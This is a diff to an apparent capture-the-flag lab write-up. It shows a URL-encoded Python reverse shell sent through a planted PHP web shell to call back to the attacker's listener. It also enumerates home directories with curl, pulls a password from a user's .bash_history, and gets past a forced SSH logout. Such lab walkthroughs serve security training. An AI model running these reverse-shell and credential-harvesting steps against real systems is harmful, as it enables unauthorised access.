@@ -188,4 +188,105 @@ We can access the shell.
 - On my machine I runned `nc -lvnp 4444`.
 
 - For target I open with my browser `http://10.10.42.44/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.21.206.128%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27`
-You can use <revshells.com>
+  You can use <revshells.com> for generating reverse shells.
+
+```bash
+❯ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.42.44 53822
+$ ls
+ls
+index.html  shell.pdf.php
+$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 www-data www-data 4096 May  5  2022 .
+drwxr-xr-x 6 www-data www-data 4096 May  5  2022 ..
+-rw-r--r-- 1 www-data www-data   26 May  5  2022 index.html
+-rw-r--r-- 1 www-data www-data   47 May  5  2022 shell.pdf.php
+$ nope
+```
+
+Bro seems to playing with. So I will use enumerate with `curl` instead.
+
+## Enumerating the Filesystem
+
+```bash
+❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home"
+<pre>total 12
+drwxr-xr-x  3 root    root    4096 May  5  2022 .
+drwxr-xr-x 19 root    root    4096 May  5  2022 ..
+drwxr-xr-x  4 lachlan lachlan 4096 May  5  2022 lachlan
+</pre>
+```
+
+```bash
+❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan"
+<pre>total 36
+drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
+drwxr-xr-x 3 root    root    4096 May  5  2022 ..
+-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
+-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
+drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
+-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
+drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
+-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
+</pre>
+```
+
+```bash
+❯ curl "http://$IP/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history"
+<pre>./cve.sh
+./cve-patch.sh
+vi /etc/cron.d/persistence
+echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
+ls -sf /dev/null /home/lachlan/.bash_history
+</pre>
+```
+
+And we found **lachlan** user's password.
+
+
+## Connecting the machine using SSH
+
+```bash
+❯ ssh lachlan@$IP        
+lachlan@10.10.42.44's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 18 Jun 2025 10:43:18 AM UTC
+
+  System load:  0.05              Processes:             140
+  Usage of /:   25.1% of 9.78GB   Users logged in:       0
+  Memory usage: 53%               IPv4 address for ens5: 10.10.42.44
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jun 18 10:41:40 2025 from 10.21.206.128
+$ nope
+Connection to 10.10.42.44 closed.
+```
+
+We still got kicked from the machine. Maybe specifying the shell solve the issue.
+
+```bash
+ssh lachlan@$IP /bin/bash
+```
+
+And it does. Now we are not kicked from the machine.
